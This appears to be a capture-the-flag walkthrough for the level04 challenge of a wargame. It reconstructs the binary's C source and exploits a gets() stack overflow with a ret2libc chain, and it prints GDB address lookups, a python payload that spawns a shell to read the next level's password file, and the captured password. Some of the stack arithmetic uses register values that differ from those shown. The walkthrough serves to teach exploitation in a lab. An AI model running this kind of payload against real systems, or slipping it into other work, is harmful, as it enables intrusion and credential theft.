# Level04

## Answer
Our C source code generates an assembly code similar to the original binary. Compile it as follows:
> There are some differences in the assembly code pointed out in the comments, they do impact the behavior of the program.
```
gcc -m32 -z execstack -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/ptrace.h>

void clear_stdin()
{
    unsigned char var = 0; // -0x9(%ebp)
    while (1)
    {
        var = getchar();
        if (var == '\n' || var == 0xff)
            break;
    }
}

unsigned int get_unum()
{
    unsigned int var1 = 0; // -0xc(%ebp)

    fflush(stdout);
    scanf("%u", &var1);
    clear_stdin();
    return var1;
}

void prog_timeout()
{
    exit(1); // Supposed to be a system call but cannot reproduce
}

void enable_timeout_cons()
{
    signal(SIGALRM, prog_timeout);
    alarm(60);
}
// any above functions are useless

// slight differences in assembly with stack variables alignment and optimization
int main()
{
    pid_t pid = fork(); // 0xac(%esp)
    char buff[128] = { 0 };  // 0x20(%esp)

    int ptrace_data = 0; // 0xa8(%esp)
    int stat_loc = 0;    // 0x1c(%esp)
    int backup;      // 0xa4(%esp)

    if (pid == 0)
    {
        prctl(1, 1);
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        puts("Give me some shellcode, k");
        gets(buff);
    }
    else
    {
        do
        {
            wait(&stat_loc);
            backup = stat_loc;

            if (WIFEXITED(stat_loc) || WIFSIGNALED(stat_loc))
            {
                puts("child is exiting...");
                return 0;
            }

            ptrace_data = ptrace(PTRACE_PEEKUSER, pid, 44, 0);
        } while (ptrace_data != 11);

        puts("no exec() for you");
        kill(pid, 9);
    }
    return 0;
}
```

Let's focus on the `main` function.  It reads input using the `gets` function, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes read. This will allow us to overflow the buffer and overwrite the return address of the `main` function.

### Ret2Libc
Check the [level01's walkthrough](../level01/walkthrough.md#ret2libc) for an explanation of the ret2libc technique.

We, therefore, need the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. These are found using GDB:

```bash
# System
(gdb) info function system
0xf7e6aed0  system
[...]

# Exit
(gdb) info function exit
0xf7e5eb70  exit
[...]

# /bin/sh
(gdb) info proc mappings
[...]
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
[...]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

To find our padding, Let's analyze the stack layout of our program:
```bash
(gdb) set follow-fork-mode child # Follow the child process

(gdb) b *main+150 # Breaking after gets
Breakpoint 1 at 0x804875e

(gdb) b *main+168 # Breaking after wait
Breakpoint 2 at 0x8048770

(gdb) r # Run the program
Starting program: /home/users/level04/level04
[New process 2910]
Give me some shellcode, k
[Switching to process 2910]

Breakpoint 1, 0x0804875e in main ()

(gdb) info registers # Check esp and ebp addresses
[...]
esp            0xffffd650       0xffffd650
ebp            0xffffd708       0xffffd708
[...]
```

By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 184 bytes:
```
0xbffff728 - 0xbffff6e0 = b8 (184 in decimal)
```	

Furthermore, we can see that our buffer is located at `0x20(%esp),%eax`. Since there is 184 bytes for the stack, our buffer will therefore require 152 bytes (184 - 32) before reaching `ebp`.

Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 156 bytes (152 + 4).

Anything written beyond those 156 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.

Alright, let's craft our payload:
```
reminder: padding + address of system + address of exit + address of "/bin/sh"

"\x90"*156 + "\xf7\xe6\xae\xd0" + "\xf7\xe5\xeb\x70" + "\xf7\xf8\x97\xec"
```

Let's run it:
```bash
level04@OverRide:~$ (python -c 'print("\x90"*156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])' && echo cat /home/users/level05/.pass) | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

We are now level05! Let's move on to the next level.